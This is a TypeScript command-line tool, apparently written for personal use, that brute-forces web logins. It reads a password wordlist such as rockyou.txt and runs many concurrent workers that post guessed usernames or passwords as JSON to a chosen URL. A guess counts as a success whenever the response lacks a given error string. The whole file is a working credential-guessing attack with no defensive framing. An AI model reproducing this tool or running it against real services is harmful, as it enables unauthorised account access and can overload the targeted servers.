//importations
import yargs from 'yargs'
import { hideBin } from 'yargs/helpers';
import fs from 'fs'
import https from 'https'
import axios from 'axios'
import dns from 'dns/promises'

//flags
const yarg= yargs(hideBin(process.argv))
.option("url",{demandOption:true,type:"string"})
.option("wordlist",{default:"/usr/share/wordlists/rockyou.txt"})
.option("username",{type:"boolean"}) // if you want to crack for bruteforce the username, you put --username true
.option("error",{default:"error"})
.option("body",{default:`{"username":"","password":""}`,type:"string"})
.option("password",{type:"boolean"}) // if you want to crack for bruteforce the password, you put --password true
.option("v",{type:"number",default:10})
.option("content",{default:"application/json"})
.option("dns",{type:"boolean",default:false})
.parseSync()


//variable declarations


let urloriginal= yarg.url



const urlObj= new URL(urloriginal)

const agent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 1000,
  maxSockets: 200,          
  maxFreeSockets: 200,        
  maxTotalSockets: 300,      
  timeout: 60000,
  scheduling: 'lifo',
  servername: urlObj.hostname
})


let ip= (await dns.lookup(urlObj.hostname,{family:4})).address

urlObj.hostname=ip

let trueurl= urlObj.href

console.log("url:",trueurl)
let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")
let error= yarg.error
let content= yarg.content
let velocidad= yarg.v





let found=false

let contador=0
let workers=0

let elemento:number=0


//functions declaracions


async function worker(){ console.log("worker iniciado")

    let body= JSON.parse(yarg.body)
    let usernamebody= Object.keys(body)[0]
    let passwordbody= Object.keys(body)[1]

    console.log("passwordbody:",passwordbody)
    let freezeelemento1= elemento
    let freezeelemento=0

    let booleanfreeze:Boolean= false

    while(found===false){
     
        
        if(booleanfreeze===true && freezeelemento1!==-1){freezeelemento=freezeelemento1; booleanfreeze=false}
        else{freezeelemento= ++elemento}
        
            if (freezeelemento >= wordlist.length) {
      break;
    }
        let passw=""
              if(yarg.password===true){
                 passw= wordlist[freezeelemento]
        try{
            freezeelemento1=freezeelemento

            body[passwordbody]=passw; 

           
            

            let currentbody={...body}

            

        
         let peticion:any= await  axios.post(trueurl,currentbody,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data], validateStatus: () => true })
         let data:String=peticion.data

                if(data.includes(error)){++contador}
                if(contador%100===0){console.log(contador)}
                if(!data.includes(error)){console.log("contraseña encontrada:",passw,"html:",data),found=true}
            

        }catch(error){booleanfreeze=true}
        
    }

    else{let user:any= wordlist[freezeelemento]
         try{
              
            body[usernamebody]=user;
            let currentbody={...body}
           let peticion:any= await axios.post(trueurl,currentbody,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]})
           let data:String= peticion.data
                if(data.includes(error)){++contador; console.log("usuario incorrecto:",user,"contador:",contador)}
                else{console.log("usuario encontrado:",user),found=true}
                freezeelemento1=freezeelemento
            } 
             catch(error){booleanfreeze=true}
    }

    
   


   
}}

//code

if(yarg.dns===false){trueurl=urloriginal}
console.warn("WARNING: in the body the username comes first and the password comes second. NO excepctions")

if(yarg.username===true && yarg.password===true){console.log("you can't to crack the username and password at the same time"); process.exit(1)}
if(!yarg.username && !yarg.password){console.log("Specify what you want to crack");process.exit(1)}



while(workers<velocidad){++workers; console.log("workers:",workers,"velocidad:",velocidad)
    worker(); 
}



